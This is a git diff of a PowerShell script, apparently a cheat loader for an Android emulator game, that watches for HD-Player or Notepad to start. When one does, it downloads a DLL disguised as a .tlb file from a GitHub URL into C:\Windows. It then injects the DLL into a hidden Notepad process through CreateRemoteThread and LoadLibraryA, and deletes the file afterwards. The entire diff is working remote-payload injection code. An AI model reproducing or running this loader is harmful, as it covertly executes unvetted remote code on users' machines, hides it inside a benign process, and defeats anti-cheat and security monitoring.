@@ -5,7 +5,9 @@ $MEM_RESERVE = 0x2000
 $PAGE_READWRITE = 0x04
 $dllUrl = "https://raw.githubusercontent.com/shivumang011/ShivUmangStreamerCheat/refs/heads/main/ShellJector.tlb"
 $dllPath = "C:\Windows\ShellJector.tlb"
-$prevHdPlayerRunning = $false
+
+$wasHdPlayerRunning = $false
+$wasNotepadRunning = $false
 
 # === Win32 API declarations ===
 Add-Type @"
@@ -34,63 +36,63 @@ public class Win32 {
 }
 "@
 
-# === Monitoring Loop ===
-while ($true) {
-    # Check if HD-Player is running
-    $hdProcess = Get-Process -Name "HD-Player" -ErrorAction SilentlyContinue
-    $hdPlayerRunning = $hdProcess -ne $null
+function Inject-IntoNewNotepad {
+    Write-Host "[*] Launching new hidden Notepad for injection..."
+    $newProcess = Start-Process -FilePath "notepad.exe" -WindowStyle Hidden -PassThru
+    Start-Sleep -Milliseconds 500
 
-    # Run only if it just started (was not running before)
-    if ($hdPlayerRunning -and -not $prevHdPlayerRunning) {
-        Write-Host "[+] HD-Player detected. Injecting once..."
+    Write-Host "[*] Downloading DLL..."
+    try {
+        Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath -UseBasicParsing -ErrorAction Stop
+    } catch {
+        Write-Host "[-] DLL download failed: $($_.Exception.Message)"
+        return
+    }
 
-        # Step 1: Start notepad hidden
-        $notepadProcess = Start-Process -FilePath "notepad.exe" -WindowStyle Hidden -PassThru
-        Start-Sleep -Milliseconds 500
+    $pid = $newProcess.Id
+    $hProcess = [Win32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $pid)
 
-        # Step 2: Download DLL silently
-        try {
-            Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath -UseBasicParsing -ErrorAction Stop
-        } catch {
-            Write-Host "[-] DLL download failed: $($_.Exception.Message)"
-            $prevHdPlayerRunning = $true
-            Start-Sleep -Seconds 2
-            continue
-        }
+    if ($hProcess -ne [IntPtr]::Zero) {
+        $dllBytes = [System.Text.Encoding]::ASCII.GetBytes($dllPath + [char]0)
+        $allocMem = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $dllBytes.Length, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_READWRITE)
 
-        # Step 3: Inject DLL into Notepad
-        $processId = $notepadProcess.Id
-        $hProcess = [Win32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $processId)
+        if ($allocMem -ne [IntPtr]::Zero) {
+            $written = [IntPtr]::Zero
+            $wrote = [Win32]::WriteProcessMemory($hProcess, $allocMem, $dllBytes, $dllBytes.Length, [ref]$written)
 
-        if ($hProcess -ne [IntPtr]::Zero) {
-            $dllBytes = [System.Text.Encoding]::ASCII.GetBytes($dllPath + [char]0)
-            $allocMem = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $dllBytes.Length, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_READWRITE)
+            if ($wrote) {
+                $hKernel32 = [Win32]::GetModuleHandle("kernel32.dll")
+                $loadLibraryAddr = [Win32]::GetProcAddress($hKernel32, "LoadLibraryA")
 
-            if ($allocMem -ne [IntPtr]::Zero) {
-                $outSize = [IntPtr]::Zero
-                $writeResult = [Win32]::WriteProcessMemory($hProcess, $allocMem, $dllBytes, $dllBytes.Length, [ref]$outSize)
-
-                if ($writeResult) {
-                    $hKernel32 = [Win32]::GetModuleHandle("kernel32.dll")
-                    $loadLibraryAddr = [Win32]::GetProcAddress($hKernel32, "LoadLibraryA")
-
-                    if ($loadLibraryAddr -ne [IntPtr]::Zero) {
-                        $threadId = [IntPtr]::Zero
-                        [Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLibraryAddr, $allocMem, 0, [ref]$threadId) | Out-Null
-                        Write-Host "[+] DLL injected successfully."
-                    }
+                if ($loadLibraryAddr -ne [IntPtr]::Zero) {
+                    $threadId = [IntPtr]::Zero
+                    [Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLibraryAddr, $allocMem, 0, [ref]$threadId) | Out-Null
+                    Write-Host "[+] DLL injected successfully."
                 }
             }
         }
-
-        # Step 4: Wait and cleanup
-        Start-Sleep -Seconds 2
-        try { Remove-Item $dllPath -Force -ErrorAction SilentlyContinue } catch {}
     }
 
-    # Update status for next loop
-    $prevHdPlayerRunning = $hdPlayerRunning
+    Start-Sleep -Seconds 2
+    try { Remove-Item $dllPath -Force -ErrorAction SilentlyContinue } catch {}
+}
 
-    # Loop delay
+# === Continuous Monitoring ===
+while ($true) {
+    $isHdPlayerRunning = Get-Process -Name "HD-Player" -ErrorAction SilentlyContinue
+    $isNotepadRunning = Get-Process -Name "notepad" -ErrorAction SilentlyContinue
+
+    $hdJustStarted = ($isHdPlayerRunning -ne $null) -and (-not $wasHdPlayerRunning)
+    $notepadJustStarted = ($isNotepadRunning -ne $null) -and (-not $wasNotepadRunning)
+
+    if ($hdJustStarted -or $notepadJustStarted) {
+        Write-Host "[+] Detected new start of: " + ($(if ($hdJustStarted) { "HD-Player" } else { "Notepad" }))
+        Inject-IntoNewNotepad
+    }
+
+    # Save current state for next loop
+    $wasHdPlayerRunning = $isHdPlayerRunning -ne $null
+    $wasNotepadRunning = $isNotepadRunning -ne $null
+
     Start-Sleep -Seconds 2
 }
